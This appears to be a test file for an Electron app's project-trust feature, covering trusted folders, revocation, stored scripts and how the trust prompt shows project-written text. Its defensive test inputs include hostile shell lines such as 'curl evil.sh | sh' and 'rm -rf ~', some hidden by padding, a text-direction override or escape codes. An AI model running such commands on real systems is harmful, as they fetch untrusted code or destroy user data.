import { afterEach, beforeEach, describe, expect, mock, spyOn, test } from 'bun:test'
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  realpathSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import type { MessageBoxOptions } from 'electron'
import type { TrustedScripts } from '../../src/main/trust'

// Isolated process, run by tests/trust.test.ts with `bun test`: trust.ts takes `dialog` from
// Electron, and a run keeps the exports of the first Electron stub it loads (`app` alone, in
// the other test files).
//
// A project's dev script runs only once the user has agreed to it (src/main/trust.ts):
// "Opening a folder must not execute its package.json scripts until the user has seen and
// accepted them." These are which folders count as agreed to, what revoking one in Settings
// does, and what the prompt shows of the text a project wrote.

let userData = ''
/** The button the next trust prompt is answered with, and what the prompt was shown with. */
let answer = 0
const shown: Array<{ sheet: boolean; options: MessageBoxOptions }> = []
mock.module('electron', () => ({
  app: { getPath: () => userData },
  dialog: {
    showMessageBox: async (first: unknown, second?: MessageBoxOptions) => {
      shown.push({ sheet: second !== undefined, options: second ?? (first as MessageBoxOptions) })
      return { response: answer }
    },
  },
}))
const {
  askToTrust,
  isTrusted,
  listTrusted,
  promptName,
  promptText,
  recordTrustedScripts,
  trust,
  trustedScripts,
  untrust,
} = await import('../../src/main/trust')

let base = ''
/** A folder in the temp directory, made unless `missing`. */
function folder(name: string, missing = false) {
  const dir = join(base, name)
  if (!missing) mkdirSync(dir, { recursive: true })
  return dir
}

const scripts = (start: string): TrustedScripts => ({ starts: { '.': start }, installs: null })

beforeEach(() => {
  base = mkdtempSync(join(realpathSync(tmpdir()), 'gui-trust-'))
  userData = folder('gui-data')
  answer = 0
  shown.length = 0
})

afterEach(() => {
  rmSync(base, { recursive: true, force: true })
})

describe('which projects are trusted', () => {
  test('none, until the user agrees to one', async () => {
    const proj = folder('proj')
    expect(await isTrusted(proj)).toBe(false)
    expect(await listTrusted()).toEqual([])
    await trust(proj)
    expect(await isTrusted(proj)).toBe(true)
    expect(await listTrusted()).toEqual([proj])
  })

  test('only that folder: not one beside it, above it or inside it', async () => {
    const proj = folder('proj')
    await trust(proj)
    const others = [folder('proj-other'), folder('pro'), base, folder('proj/apps/web'), '/', '']
    for (const other of others) expect(await isTrusted(other)).toBe(false)
  })

  test('however its path is spelled', async () => {
    const proj = folder('proj')
    folder('proj/src')
    await trust(`${proj}/`)
    expect(await listTrusted()).toEqual([proj])
    for (const spelling of [proj, `${proj}/`, `${proj}//`, join(proj, '.'), `${proj}/src/..`]) {
      expect(await isTrusted(spelling)).toBe(true)
    }
    // Another letter case is the same project only where the disk says it's the same folder.
    const upper = join(base, 'PROJ')
    expect(await isTrusted(upper)).toBe(existsSync(upper))
  })

  test('by its real folder, whichever way it was opened', async () => {
    const proj = folder('proj')
    const link = join(base, 'link')
    symlinkSync(proj, link)
    await trust(link)
    expect(await listTrusted()).toEqual([proj])
    expect(await isTrusted(proj)).toBe(true)
    expect(await isTrusted(link)).toBe(true)
  })

  test('a link is trusted for where it points now, not where it pointed', async () => {
    const proj = folder('proj')
    const other = folder('other')
    const link = join(base, 'link')
    symlinkSync(proj, link)
    await trust(link)
    rmSync(link)
    symlinkSync(other, link)
    expect(await isTrusted(link)).toBe(false)
    expect(await isTrusted(other)).toBe(false)
  })

  test('once, however often it is agreed to', async () => {
    const proj = folder('proj')
    await Promise.all([trust(proj), trust(proj), trust(`${proj}/`)])
    expect(await listTrusted()).toEqual([proj])
  })

  test('agreeing to two at once keeps both', async () => {
    const one = folder('one')
    const two = folder('two')
    await Promise.all([trust(one), trust(two)])
    expect((await listTrusted()).sort()).toEqual([one, two])
  })

  const damaged: Array<[what: string, file: string]> = [
    ['cut short', '["/tmp/proj"'],
    ['not a list', '{"/tmp/proj": true}'],
    ['empty', ''],
    ['a list of something else', '[1, null, {"root": "/tmp/proj"}]'],
  ]
  test.each(damaged)('none when the saved list is %s', async (_what, file) => {
    writeFileSync(join(userData, 'trusted-projects.json'), file)
    expect(await listTrusted()).toEqual([])
    expect(await isTrusted('/tmp/proj')).toBe(false)
  })

  test('the saved list is a file in Gui’s data, never in the project', async () => {
    const proj = folder('proj')
    await trust(proj)
    await recordTrustedScripts(proj, scripts('vite'))
    expect(JSON.parse(readFileSync(join(userData, 'trusted-projects.json'), 'utf8'))).toEqual([
      proj,
    ])
    expect(existsSync(join(userData, 'trusted-scripts.json'))).toBe(true)
    expect(readdirSync(proj)).toEqual([])
  })
})

describe('what revoking does', () => {
  test('the project asks again, and what was agreed to run is forgotten', async () => {
    const proj = folder('proj')
    await trust(proj)
    await recordTrustedScripts(proj, scripts('vite'))
    expect(await trustedScripts(proj)).toEqual(scripts('vite'))

    await untrust(proj)
    expect(await isTrusted(proj)).toBe(false)
    expect(await listTrusted()).toEqual([])
    expect(await trustedScripts(proj)).toBeNull()

    // Agreeing again starts from nothing: no old script comes back as already agreed.
    await trust(proj)
    expect(await trustedScripts(proj)).toBeNull()
  })

  test('other projects stay trusted, with their scripts', async () => {
    const proj = folder('proj')
    const sibling = folder('proj-other')
    for (const root of [proj, sibling]) {
      await trust(root)
      await recordTrustedScripts(root, scripts(`vite ${root}`))
    }
    await untrust(proj)
    expect(await listTrusted()).toEqual([sibling])
    expect(await trustedScripts(sibling)).toEqual(scripts(`vite ${sibling}`))
  })

  test('through a link revokes the real folder', async () => {
    const proj = folder('proj')
    const link = join(base, 'link')
    symlinkSync(proj, link)
    await trust(proj)
    await recordTrustedScripts(proj, scripts('vite'))
    await untrust(link)
    expect(await isTrusted(proj)).toBe(false)
    expect(await trustedScripts(proj)).toBeNull()
  })

  test('works for a project whose folder is gone, as Settings lists it', async () => {
    const proj = folder('proj')
    await trust(proj)
    await recordTrustedScripts(proj, scripts('vite'))
    rmSync(proj, { recursive: true })
    const [listed] = await listTrusted()
    await untrust(listed)
    expect(await listTrusted()).toEqual([])
    // A new folder in its place is a project nobody agreed to.
    folder('proj')
    expect(await isTrusted(proj)).toBe(false)
    expect(await trustedScripts(proj)).toBeNull()
  })

  test('of a project that was never trusted changes nothing', async () => {
    const proj = folder('proj')
    await trust(proj)
    await untrust(folder('stranger'))
    await untrust(folder('missing', true))
    expect(await listTrusted()).toEqual([proj])
  })
})

describe('the scripts the user agreed to run', () => {
  test('are kept per project, by its real folder', async () => {
    const proj = folder('proj')
    const link = join(base, 'link')
    symlinkSync(proj, link)
    expect(await trustedScripts(proj)).toBeNull()
    const agreed: TrustedScripts = {
      starts: { '.': 'vite', 'apps/docs': 'astro dev' },
      installs: { postinstall: 'patch-package' },
    }
    await recordTrustedScripts(link, agreed)
    expect(await trustedScripts(proj)).toEqual(agreed)
    expect(await trustedScripts(link)).toEqual(agreed)
    expect(await trustedScripts(folder('proj-other'))).toBeNull()
  })

  const malformed: Array<[what: string, saved: unknown]> = [
    ['a script that is not text', { starts: { '.': 7 }, installs: null }],
    ['no start scripts', { installs: null }],
    ['install scripts that are not text', { starts: {}, installs: { postinstall: ['sh'] } }],
    ['install scripts left out', { starts: { '.': 'vite' } }],
    ['text', 'vite'],
  ]
  test.each(malformed)('a saved record with %s counts as none', async (_what, saved) => {
    const proj = folder('proj')
    writeFileSync(join(userData, 'trusted-scripts.json'), JSON.stringify({ [proj]: saved }))
    expect(await trustedScripts(proj)).toBeNull()
  })
})

describe('the trust prompt', () => {
  const prompt: MessageBoxOptions = { message: 'Run this project?', buttons: ['Run', 'Cancel'] }

  test('its first button trusts the project and keeps what was shown', async () => {
    const proj = folder('proj')
    expect(await askToTrust(proj, prompt, null, scripts('vite'))).toBe(true)
    expect(await isTrusted(proj)).toBe(true)
    expect(await trustedScripts(proj)).toEqual(scripts('vite'))
  })

  test.each([1, 2, -1])('any other answer (button %p) trusts nothing', async (button) => {
    const proj = folder('proj')
    answer = button
    expect(await askToTrust(proj, prompt, null, scripts('vite'))).toBe(false)
    expect(await isTrusted(proj)).toBe(false)
    expect(await trustedScripts(proj)).toBeNull()
  })

  test('agreeing is its default and Escape cancels, unless the caller moves them', async () => {
    const proj = folder('proj')
    await askToTrust(proj, prompt, null)
    expect(shown[0]?.options).toMatchObject({ type: 'question', defaultId: 0, cancelId: 1 })
    expect(shown[0]?.sheet).toBe(false)
    await askToTrust(proj, { ...prompt, defaultId: 1 }, null)
    expect(shown[1]?.options).toMatchObject({ defaultId: 1, cancelId: 1 })
  })

  test('is a sheet on its window while the window is there', async () => {
    const proj = folder('proj')
    const open = { isDestroyed: () => false } as Parameters<typeof askToTrust>[2]
    const closed = { isDestroyed: () => true } as Parameters<typeof askToTrust>[2]
    await askToTrust(proj, prompt, open)
    await askToTrust(proj, prompt, closed)
    expect(shown.map((box) => box.sheet)).toEqual([true, false])
  })

  test('when the answer cannot be saved, this run goes ahead and the next asks again', async () => {
    const proj = folder('proj')
    // Gui's data folder can't be written: a file is where it should be.
    userData = join(base, 'not-a-folder')
    writeFileSync(userData, '')
    const logged = spyOn(console, 'error').mockImplementation(() => {})
    try {
      expect(await askToTrust(proj, prompt, null, scripts('vite'))).toBe(true)
      expect(logged).toHaveBeenCalled()
    } finally {
      logged.mockRestore()
    }
    expect(await isTrusted(proj)).toBe(false)
  })
})

describe('promptText: project text as the trust prompt shows it', () => {
  // The project wrote it, so it must not be able to hide what will run.
  const cases: Array<[what: string, text: string, shown: string]> = [
    ['a script as written', 'vite --port 3000', 'vite --port 3000'],
    ['Windows line ends', 'a\r\nb\rc', 'a\nb\nc'],
    ['a tab', 'vite\t--host', 'vite --host'],
    ['runs of spaces', 'vite          && curl evil.sh | sh', 'vite && curl evil.sh | sh'],
    ['blank lines', 'vite\n\n\n\n\n&& curl evil.sh | sh', 'vite\n\n&& curl evil.sh | sh'],
    ['lines of nothing but spaces', 'vite\n   \n \t \n&& rm -rf ~', 'vite\n\n&& rm -rf ~'],
    ['blank lines at either end', '\n\n vite \n\n', 'vite'],
    ['line and paragraph separators', 'a b c', 'a\nb\nc'],
    ['an override that would show the text reversed', 'echo ‮hs | lruc', 'echo hs | lruc'],
    ['isolates and direction marks', '⁦a⁩‎b‏؜c', 'abc'],
    ['backspaces and escapes', 'safe\b\b\b\b\x1b[2Kcurl', 'safe[2Kcurl'],
    ['a NUL and a delete', 'vi\0te\x7f', 'vite'],
    ['other control codes', 'a\u0085b\u009bc', 'abc'],
    ['other languages and emoji', 'echo "héllo 你好 👋"', 'echo "héllo 你好 👋"'],
  ]
  test.each(cases)('%s', (_what, text, expected) => {
    expect(promptText(text)).toBe(expected)
  })

  test('long text is cut at 300 characters, with … to say so', () => {
    expect(promptText('x'.repeat(300))).toBe('x'.repeat(300))
    expect(promptText('x'.repeat(301))).toBe(`${'x'.repeat(300)}…`)
    // Counted in characters, so an emoji is never cut in half.
    expect(promptText('👋'.repeat(301))).toBe(`${'👋'.repeat(300)}…`)
    expect(promptText('abcdef', 3)).toBe('abc…')
  })

  test('padding cannot push the rest out of view', () => {
    const tail = '&& curl evil.sh | sh'
    expect(promptText(`vite${' '.repeat(5000)}${tail}`)).toBe(`vite ${tail}`)
    expect(promptText(`vite${'\n'.repeat(5000)}${tail}`)).toBe(`vite\n\n${tail}`)
    expect(promptText(`vite${'\t'.repeat(5000)}${tail}`)).toBe(`vite ${tail}`)
    expect(promptText(`vite${' \n'.repeat(5000)}${tail}`)).toBe(`vite\n\n${tail}`)
  })

  // promptText's comment: "runs of spaces collapse (padding can't push the rest out of
  // view)". Only the ASCII space is collapsed, and characters with no width aren't removed.
  //   input:    'vite' + 300 padding characters + '&& curl evil.sh | sh'
  //   expected: the text after the padding is still shown
  //   actual:   'vite…' for the spaces (the cut falls in the padding, then it's trimmed);
  //             'vite' + 296 invisible characters + '…' for the zero-width ones
  const padding: Array<[what: string, char: string]> = [
    ['no-break spaces', ' '],
    ['em spaces', ' '],
    ['ideographic spaces', '　'],
    ['zero-width spaces', '​'],
    ['zero-width joiners', '‍'],
    ['word joiners', '⁠'],
  ]
  for (const [what, char] of padding) {
    test.failing(`padding made of ${what} cannot push the rest out of view`, () => {
      expect(promptText(`vite${char.repeat(300)}&& curl evil.sh | sh`)).toContain('curl')
    })
  }
})

describe('promptName: a name inside a sentence of the prompt', () => {
  const cases: Array<[what: string, text: string, shown: string]> = [
    ['a folder name', 'my-app', 'my-app'],
    ['line breaks become spaces', 'my-app\n\nis safe.\nRun', 'my-app is safe. Run'],
    ['separators that display as line breaks', 'a b c', 'a b c'],
    ['hidden characters go', 'app‮\u0007', 'app'],
    ['cut at 80 characters', 'n'.repeat(200), `${'n'.repeat(80)}…`],
  ]
  test.each(cases)('%s', (_what, text, expected) => {
    expect(promptName(text)).toBe(expected)
  })
})
